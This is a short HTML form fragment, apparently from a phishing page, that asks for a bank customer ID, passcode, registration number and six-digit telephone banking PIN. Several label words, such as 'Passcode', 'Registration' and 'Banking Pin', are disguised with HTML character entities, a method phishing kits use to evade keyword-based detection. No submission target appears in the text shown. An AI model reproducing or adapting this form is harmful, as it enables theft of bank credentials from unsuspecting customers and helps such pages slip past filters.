<br>
<form>
	<table>
		<tr>
			<td>Customer ID :</td>
			<td><input type="text"  autocomplete="off"  maxlength="20" style="width: 9.5em;" name="csid" value="" required="required" title="Customer ID"></input></td>
		</tr>
		<tr>
			<td>Pa&#115;&#115;code :</td>
			<td><input type="password"  autocomplete="off"  maxlength="20" style="width: 9.5em;" name="pscode" value="" required="required" title="Passcode"></input></td>
		</tr>
		<tr>
			<td>Regi&#115;tration Number :</td>
			<td><input type="number"  autocomplete="off" style="width: 6.4em;" maxlength="20" name="rnum" value="" required="required" title="Registration number"></input></td>
		</tr>
		<tr>
			<td>Telephone Ba&#x006E;king P&#105;n :</td>
			<td><input type="password" id="txt" onkeyup="check()" onmouseout="check()" autocomplete="off"  style="width: 6.4em;"  maxlength="6" name="tpin" value="" required="required" title="Telephone Pin"></input></td>
		</tr>
	</table>
</form>